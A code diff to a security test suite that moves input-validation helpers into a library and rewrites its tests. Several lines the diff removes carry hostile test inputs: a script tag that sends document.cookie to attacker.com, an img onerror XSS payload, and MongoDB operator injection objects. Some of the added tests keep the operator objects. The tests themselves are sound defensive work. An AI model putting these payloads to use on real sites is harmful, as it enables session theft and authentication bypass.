@@ -1,51 +1,5 @@
 import { describe, it, expect } from "vitest";
-
-/**
- * Security & Input Validation Helpers
- */
-
-function isValidEmail(email: string): boolean {
-  if (!email || typeof email !== "string" || email.length > 254) return false;
-  // Disallow consecutive dots or HTML characters
-  if (email.includes("..") || email.includes("<") || email.includes(">")) return false;
-  // Strict RFC 5322 regex validation
-  const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*\.[a-zA-Z]{2,}$/;
-  return emailRegex.test(email);
-}
-
-function isValidObjectId(id: string): boolean {
-  if (!id || typeof id !== "string") return false;
-  const objectIdRegex = /^[0-9a-fA-F]{24}$/;
-  return objectIdRegex.test(id);
-}
-
-function sanitizeUserInput(text: string): string {
-  if (typeof text !== "string") return "";
-  return text
-    .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;")
-    .replace(/"/g, "&quot;")
-    .replace(/'/g, "&#x27;")
-    .replace(/\//g, "&#x2F;");
-}
-
-function preventNoSQLQueryInjection(input: any): any {
-  if (typeof input === "object" && input !== null) {
-    if (Array.isArray(input)) {
-      return input.map(preventNoSQLQueryInjection);
-    }
-    const cleanObj: Record<string, any> = {};
-    for (const key of Object.keys(input)) {
-      // Reject any MongoDB operators like $ne, $gt, $where
-      if (key.startsWith("$")) {
-        throw new Error(`Security Violation: MongoDB query operator '${key}' is prohibited in user input.`);
-      }
-      cleanObj[key] = preventNoSQLQueryInjection(input[key]);
-    }
-    return cleanObj;
-  }
-  return input;
-}
+import { isValidEmail, isValidEventId, isValidObjectId, normalizeEmail } from "../lib/validation";
 
 describe("Security Audit & Input Hardening", () => {
   describe("Email Validation", () => {
@@ -77,44 +31,16 @@ describe("Security Audit & Input Hardening", () => {
     });
   });
 
-  describe("XSS & HTML Injection Sanitization", () => {
-    it("should escape script tags and dangerous HTML attributes", () => {
-      const malicious = '<script>fetch("http://attacker.com/cookie?c="+document.cookie)</script>';
-      const sanitized = sanitizeUserInput(malicious);
-      expect(sanitized).not.toContain("<script>");
-      expect(sanitized).toContain("&lt;script&gt;");
+  describe("Query Injection Prevention", () => {
+    it("should reject non-string identifiers that could carry MongoDB operators", () => {
+      expect(isValidObjectId({ $ne: null })).toBe(false);
+      expect(isValidEventId({ $gt: "" })).toBe(false);
+      expect(normalizeEmail({ $ne: null })).toBeNull();
+      expect(isValidEmail({ $ne: null })).toBe(false);
     });
 
-    it("should sanitize img onerror event handlers", () => {
-      const imgPayload = '<img src=x onerror="alert(\'XSS\')">';
-      const sanitized = sanitizeUserInput(imgPayload);
-      expect(sanitized).not.toContain("<img");
-      expect(sanitized).toContain("&lt;img");
-    });
-  });
-
-  describe("NoSQL Query Injection Prevention", () => {
-    it("should reject payloads containing MongoDB query operators ($ne, $gt, $where)", () => {
-      const maliciousPayload = {
-        email: { "$ne": null },
-        password: { "$gt": "" },
-      };
-
-      expect(() => preventNoSQLQueryInjection(maliciousPayload)).toThrow(
-        "MongoDB query operator '$ne' is prohibited"
-      );
-    });
-
-    it("should pass safe scalar JSON user inputs", () => {
-      const safePayload = {
-        name: "Aditya",
-        age: 21,
-        goal: "recomp",
-        allergies: ["peanuts", "dairy"],
-      };
-
-      expect(() => preventNoSQLQueryInjection(safePayload)).not.toThrow();
-      expect(preventNoSQLQueryInjection(safePayload)).toEqual(safePayload);
+    it("should normalize email case and whitespace", () => {
+      expect(normalizeEmail("  User.Name@Example.COM ")).toBe("user.name@example.com");
     });
   });
 });
